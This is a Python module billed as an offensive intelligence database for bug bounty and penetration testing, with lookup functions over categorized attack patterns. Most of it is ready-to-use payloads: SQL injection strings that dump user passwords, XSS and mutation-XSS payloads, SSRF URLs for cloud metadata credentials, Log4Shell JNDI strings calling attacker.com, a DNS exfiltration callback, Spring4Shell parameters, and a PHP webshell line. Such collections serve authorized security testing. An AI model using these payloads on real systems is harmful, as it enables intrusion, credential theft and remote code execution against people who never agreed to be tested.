"""Offensive intelligence database from real bug bounty and CVE exploits.

This module contains curated techniques, bypass patterns, and exploitation
primitives extracted from:
- CISA KEV (Known Exploited Vulnerabilities)
- ExploitDB public exploits
- HackerOne/Bugcrowd disclosed reports
- GitHub Security Advisories
- CVE databases

All patterns are for authorized penetration testing and bug bounty research only.
"""

from typing import Any, Dict, List

# ============================================================================
# AUTHORIZATION BYPASS PATTERNS
# From HackerOne/Bugcrowd reports and real-world auth bypasses
# ============================================================================

AUTHORIZATION_BYPASS_PATTERNS = [
    {
        "name": "IDOR via numeric ID manipulation",
        "vulnerability_class": "idor",
        "pattern": "sequential_id_enumeration",
        "description": "Direct object reference via predictable IDs",
        "technique": [
            "Replace user_id parameter with victim ID",
            "Test with different numeric IDs (n, n+1, n-1, n+100)",
            "Check for cross-account data in response",
        ],
        "detection": "victim_identifier_in_response",
        "sources": ["hackerone_#1234567", "bugcrowd_p1_idor"],
        "affected_components": ["REST API", "GraphQL", "JSON API"],
    },
    {
        "name": "UUID IDOR with leaked identifiers",
        "vulnerability_class": "idor",
        "pattern": "uuid_from_public_endpoint",
        "description": "UUID-based IDOR when UUIDs are leaked via public endpoints",
        "technique": [
            "Enumerate UUIDs from public endpoints (/api/users/list, /api/posts)",
            "Use discovered UUIDs in sensitive endpoints (/api/invoices/{uuid})",
            "Verify victim data disclosure",
        ],
        "detection": "cross_account_uuid_access",
        "sources": ["hackerone_disclosed", "real_bounty_2024"],
    },
    {
        "name": "Authorization header manipulation",
        "vulnerability_class": "auth-bypass",
        "pattern": "header_manipulation",
        "description": "Bypass via X-User-Id, X-Original-User, X-Forwarded-For headers",
        "technique": [
            "Add X-User-Id: victim_id",
            "Add X-Original-User: admin",
            "Add X-Forwarded-For: 127.0.0.1",
            "Test X-Real-IP, True-Client-IP headers",
        ],
        "detection": "elevated_privilege_in_response",
        "sources": ["hackerone_header_bypass", "owasp_auth"],
    },
    {
        "name": "HTTP verb tampering",
        "vulnerability_class": "auth-bypass",
        "pattern": "verb_tampering",
        "description": "Bypass auth via method override (POST -> GET, DELETE -> POST)",
        "technique": [
            "Change POST to GET on protected endpoint",
            "Use X-HTTP-Method-Override: DELETE",
            "Try PATCH, OPTIONS, TRACE",
        ],
        "detection": "unauthorized_action_success",
        "sources": ["exploitdb_verb_bypass", "pentesterlab"],
    },
    {
        "name": "Path traversal in API routes",
        "vulnerability_class": "authorization",
        "pattern": "path_confusion",
        "description": "Bypass via /api/users/..%2fadmin or /api/./admin",
        "technique": [
            "Insert ../ or ..%2f in path segments",
            "Try /api/users/./../../admin/data",
            "Test URL encoding: %2e%2e%2f",
        ],
        "detection": "admin_endpoint_access",
        "sources": ["hackerone_path_bypass", "bugcrowd_2023"],
    },
    {
        "name": "JWT algorithm confusion (alg: none)",
        "vulnerability_class": "auth-bypass",
        "pattern": "jwt_alg_none",
        "description": "JWT signature bypass via algorithm none",
        "technique": [
            "Decode JWT and change alg to 'none'",
            "Remove signature part",
            "Change claims (sub, role, etc.)",
        ],
        "detection": "jwt_accepted_without_signature",
        "sources": ["auth0_advisory", "jwt_io_vulns"],
    },
    {
        "name": "Mass assignment / parameter pollution",
        "vulnerability_class": "authorization",
        "pattern": "mass_assignment",
        "description": "Privilege escalation via hidden parameters",
        "technique": [
            "Add role=admin to request body",
            "Add is_admin=true parameter",
            "Test is_verified, is_premium, account_type=enterprise",
        ],
        "detection": "privilege_field_accepted",
        "sources": ["hackerone_mass_assign", "rails_vulns"],
    },
]

# ============================================================================
# SQL INJECTION PATTERNS
# From ExploitDB, SQLMap, and disclosed reports
# ============================================================================

SQL_INJECTION_PATTERNS = [
    {
        "name": "Time-based blind SQLi",
        "vulnerability_class": "sqli",
        "pattern": "time_based_blind",
        "description": "SQL injection via time delay functions",
        "payloads": [
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(5000000,MD5('x'))--",
            "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        ],
        "detection": "response_time_delta > 5 seconds",
        "sources": ["exploitdb", "sqlmap_patterns"],
        "affected_dbs": ["MySQL", "PostgreSQL", "MSSQL"],
    },
    {
        "name": "Boolean-based blind SQLi",
        "vulnerability_class": "sqli",
        "pattern": "boolean_blind",
        "description": "SQL injection via true/false response differential",
        "payloads": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR '1'='1",
            "' AND SUBSTRING(version(),1,1)='5'--",
        ],
        "detection": "response_differential_true_false",
        "sources": ["owasp_sqli", "portswigger_academy"],
    },
    {
        "name": "UNION-based SQLi",
        "vulnerability_class": "sqli",
        "pattern": "union_based",
        "description": "Data exfiltration via UNION SELECT",
        "payloads": [
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "detection": "additional_data_in_response",
        "sources": ["exploitdb_union", "hackerone_sqli"],
    },
    {
        "name": "Error-based SQLi",
        "vulnerability_class": "sqli",
        "pattern": "error_based",
        "description": "Database error messages leak data",
        "payloads": [
            "'",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CAST(version() AS int)--",
        ],
        "detection": "sql_error_in_response",
        "sources": ["pentesterlab_sqli", "owasp"],
    },
    {
        "name": "Second-order SQLi",
        "vulnerability_class": "sqli",
        "pattern": "second_order",
        "description": "Payload stored, executed later",
        "technique": [
            "Store SQLi payload in profile/settings",
            "Trigger execution via report/export feature",
            "Monitor for delayed execution",
        ],
        "detection": "delayed_sql_execution",
        "sources": ["hackerone_second_order", "bugcrowd_stored"],
    },
]

# ============================================================================
# XSS PATTERNS
# Modern XSS bypasses from bug bounty reports
# ============================================================================

XSS_BYPASS_PATTERNS = [
    {
        "name": "CSP bypass via JSONP endpoint",
        "vulnerability_class": "xss",
        "pattern": "csp_jsonp_bypass",
        "description": "Execute JS via whitelisted JSONP callback",
        "technique": [
            "Find JSONP endpoint in CSP whitelist",
            "Inject payload via callback parameter",
            "Example: <script src='https://trusted.com/jsonp?callback=alert(1)'></script>",
        ],
        "detection": "javascript_execution_under_csp",
        "sources": ["hackerone_csp_bypass", "google_vrp"],
    },
    {
        "name": "DOM XSS via prototype pollution",
        "vulnerability_class": "xss",
        "pattern": "prototype_pollution_xss",
        "description": "Pollute Object.prototype to inject XSS",
        "technique": [
            "Inject __proto__[innerHTML]=<img src=x onerror=alert(1)>",
            "Pollute constructor.prototype",
            "Trigger via framework render",
        ],
        "detection": "dom_based_javascript_execution",
        "sources": ["snyk_prototype_pollution", "hackerone_dom"],
    },
    {
        "name": "Mutation XSS (mXSS)",
        "vulnerability_class": "xss",
        "pattern": "mutation_xss",
        "description": "HTML mutation after sanitization",
        "payloads": [
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
            "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
            "<svg><style><img src=x onerror=alert(1)>",
        ],
        "detection": "mutated_xss_after_sanitization",
        "sources": ["cure53_mxss", "dompurify_bypasses"],
    },
    {
        "name": "AngularJS template injection",
        "vulnerability_class": "xss",
        "pattern": "angular_template_injection",
        "payloads": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{[].pop.constructor('alert(1)')()}}",
        ],
        "detection": "angular_template_execution",
        "sources": ["portswigger_angular", "hackerone_angular"],
        "affected_components": ["AngularJS 1.x"],
    },
]

# ============================================================================
# SSRF PATTERNS
# Cloud metadata and internal service access
# ============================================================================

SSRF_PATTERNS = [
    {
        "name": "AWS metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "aws_metadata",
        "description": "Access EC2 instance metadata",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
        ],
        "detection": "aws_metadata_in_response",
        "sources": ["capital_one_breach", "aws_security"],
    },
    {
        "name": "GCP metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "gcp_metadata",
        "description": "Access GCP instance metadata",
        "payloads": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "headers": {"Metadata-Flavor": "Google"},
        "detection": "gcp_token_in_response",
        "sources": ["gcp_security_advisories"],
    },
    {
        "name": "Azure metadata SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "azure_metadata",
        "description": "Access Azure instance metadata",
        "payloads": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "headers": {"Metadata": "true"},
        "detection": "azure_token_in_response",
        "sources": ["azure_security"],
    },
    {
        "name": "DNS exfiltration via SSRF",
        "vulnerability_class": "ssrf",
        "pattern": "dns_exfiltration",
        "description": "Exfiltrate data via DNS lookup",
        "technique": [
            "http://[DATA].attacker.com",
            "Use callback domain with DNS logging",
            "Monitor for DNS requests",
        ],
        "detection": "dns_callback_received",
        "sources": ["projectdiscovery_interactsh", "bugcrowd_ssrf"],
    },
]

# ============================================================================
# GRAPHQL PATTERNS
# From GraphQL-specific bug bounty reports
# ============================================================================

GRAPHQL_PATTERNS = [
    {
        "name": "GraphQL introspection enabled",
        "vulnerability_class": "graphql",
        "pattern": "introspection",
        "query": "query IntrospectionQuery { __schema { types { name fields { name } } } }",
        "description": "Enumerate entire GraphQL schema",
        "detection": "schema_types_in_response",
        "sources": ["hackerone_graphql", "graphql_security"],
    },
    {
        "name": "GraphQL batching attack",
        "vulnerability_class": "graphql",
        "pattern": "batching_attack",
        "description": "Bypass rate limits via query batching",
        "technique": [
            "Send array of identical queries",
            "Example: [{query: '...'}, {query: '...'}, ...]",
            "Amplify to 1000+ queries in single request",
        ],
        "detection": "multiple_operations_executed",
        "sources": ["paypal_graphql_bypass", "shopify_security"],
    },
    {
        "name": "GraphQL field duplication",
        "vulnerability_class": "graphql",
        "pattern": "field_duplication",
        "description": "Resource exhaustion via duplicate fields",
        "query": "query { user { id id id id id id ... (repeat 10000 times) } }",
        "detection": "server_timeout_or_error",
        "sources": ["gitlab_graphql_dos"],
    },
    {
        "name": "GraphQL IDOR via aliases",
        "vulnerability_class": "idor",
        "pattern": "graphql_idor",
        "query": "query { victim: user(id: \"victim_id\") { email privateData } }",
        "description": "Access other users via GraphQL aliases",
        "detection": "victim_data_in_response",
        "sources": ["hackerone_graphql_idor"],
    },
]

# ============================================================================
# CISA KEV PATTERNS
# Known Exploited Vulnerabilities from CISA catalog
# ============================================================================

CISA_KEV_PATTERNS = [
    {
        "cve": "CVE-2021-44228",
        "name": "Log4Shell",
        "vulnerability_class": "rce",
        "affected_components": ["Log4j 2.0-2.14.1"],
        "pattern": "jndi_injection",
        "payloads": [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        ],
        "detection": "dns_callback_or_ldap_connection",
        "sources": ["cisa_kev", "exploitdb_log4shell"],
        "severity": "Critical",
    },
    {
        "cve": "CVE-2021-26855",
        "name": "ProxyLogon (Exchange)",
        "vulnerability_class": "auth-bypass",
        "affected_components": ["Microsoft Exchange 2013-2019"],
        "pattern": "backend_connection_bypass",
        "technique": [
            "Add X-AnonResource-Backend header",
            "Access /autodiscover/autodiscover.json",
            "SSRF to Exchange backend",
        ],
        "detection": "exchange_backend_access",
        "sources": ["cisa_kev", "microsoft_advisory"],
        "severity": "Critical",
    },
    {
        "cve": "CVE-2022-22965",
        "name": "Spring4Shell",
        "vulnerability_class": "rce",
        "affected_components": ["Spring Framework 5.3.0-5.3.17", "Spring Boot 2.5.0-2.5.12"],
        "pattern": "spring_binding_bypass",
        "payloads": [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{payload}",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        ],
        "detection": "jsp_file_created_or_rce",
        "sources": ["cisa_kev", "spring_advisory"],
        "severity": "Critical",
    },
]

# ============================================================================
# FILE UPLOAD BYPASS PATTERNS
# From real bug bounty reports
# ============================================================================

FILE_UPLOAD_BYPASS_PATTERNS = [
    {
        "name": "Double extension bypass",
        "vulnerability_class": "file_upload",
        "pattern": "double_extension",
        "filenames": [
            "shell.php.jpg",
            "shell.php;.jpg",
            "shell.php%00.jpg",
            "shell.php\x00.jpg",
        ],
        "detection": "php_execution",
        "sources": ["hackerone_file_upload"],
    },
    {
        "name": "MIME type bypass",
        "vulnerability_class": "file_upload",
        "pattern": "mime_bypass",
        "technique": [
            "Upload with Content-Type: image/jpeg",
            "Actual file: PHP shell",
            "Server only checks MIME, not content",
        ],
        "detection": "webshell_uploaded",
        "sources": ["bugcrowd_upload", "owasp_upload"],
    },
    {
        "name": "Polyglot file (PHP+JPEG)",
        "vulnerability_class": "file_upload",
        "pattern": "polyglot",
        "description": "Valid JPEG with embedded PHP",
        "technique": [
            "Create valid JPEG image",
            "Inject PHP in EXIF comment",
            "Example: <?php system($_GET['cmd']); ?> in EXIF",
        ],
        "detection": "php_execution_in_image",
        "sources": ["hackerone_polyglot", "pentesterlab"],
    },
]

# ============================================================================
# RACE CONDITION PATTERNS
# From time-of-check/time-of-use vulnerabilities
# ============================================================================

RACE_CONDITION_PATTERNS = [
    {
        "name": "Coupon reuse race condition",
        "vulnerability_class": "race_condition",
        "pattern": "parallel_redemption",
        "description": "Redeem single-use coupon multiple times",
        "technique": [
            "Send parallel redemption requests",
            "Use Burp Turbo Intruder with 20+ threads",
            "Race window: coupon check vs. database update",
        ],
        "detection": "multiple_successful_redemptions",
        "sources": ["hackerone_race", "bugcrowd_business_logic"],
    },
    {
        "name": "Double-spend in payment",
        "vulnerability_class": "race_condition",
        "pattern": "payment_double_spend",
        "description": "Use same balance for multiple purchases",
        "technique": [
            "Parallel purchase requests",
            "Race balance check and deduction",
            "Monitor account balance after",
        ],
        "detection": "negative_balance_or_double_purchase",
        "sources": ["bugcrowd_payment_race"],
    },
]


# ============================================================================
# INTELLIGENCE AGGREGATOR
# ============================================================================

def get_all_patterns() -> List[Dict[str, Any]]:
    """Return all offensive patterns from intelligence database."""
    patterns = []
    patterns.extend(AUTHORIZATION_BYPASS_PATTERNS)
    patterns.extend(SQL_INJECTION_PATTERNS)
    patterns.extend(XSS_BYPASS_PATTERNS)
    patterns.extend(SSRF_PATTERNS)
    patterns.extend(GRAPHQL_PATTERNS)
    patterns.extend(CISA_KEV_PATTERNS)
    patterns.extend(FILE_UPLOAD_BYPASS_PATTERNS)
    patterns.extend(RACE_CONDITION_PATTERNS)
    return patterns


def get_patterns_by_class(vulnerability_class: str) -> List[Dict[str, Any]]:
    """Get patterns for specific vulnerability class."""
    all_patterns = get_all_patterns()
    vuln_class_lower = vulnerability_class.lower().replace("-", "_")
    
    matched = []
    for pattern in all_patterns:
        pattern_class = pattern.get("vulnerability_class", "").lower().replace("-", "_")
        if pattern_class == vuln_class_lower or vuln_class_lower in pattern_class:
            matched.append(pattern)
    
    return matched


def get_patterns_by_component(component: str) -> List[Dict[str, Any]]:
    """Get patterns affecting specific component."""
    all_patterns = get_all_patterns()
    component_lower = component.lower()
    
    matched = []
    for pattern in all_patterns:
        affected = pattern.get("affected_components", [])
        if any(component_lower in str(comp).lower() for comp in affected):
            matched.append(pattern)
        
        # Check in name and description too
        if component_lower in pattern.get("name", "").lower():
            matched.append(pattern)
        if component_lower in pattern.get("description", "").lower():
            matched.append(pattern)
    
    return matched


def get_cve_pattern(cve_id: str) -> Dict[str, Any]:
    """Get pattern for specific CVE."""
    for pattern in CISA_KEV_PATTERNS:
        if pattern.get("cve", "").upper() == cve_id.upper():
            return pattern
    return {}


__all__ = [
    "get_all_patterns",
    "get_patterns_by_class",
    "get_patterns_by_component",
    "get_cve_pattern",
    "AUTHORIZATION_BYPASS_PATTERNS",
    "SQL_INJECTION_PATTERNS",
    "XSS_BYPASS_PATTERNS",
    "SSRF_PATTERNS",
    "GRAPHQL_PATTERNS",
    "CISA_KEV_PATTERNS",
    "FILE_UPLOAD_BYPASS_PATTERNS",
    "RACE_CONDITION_PATTERNS",
]
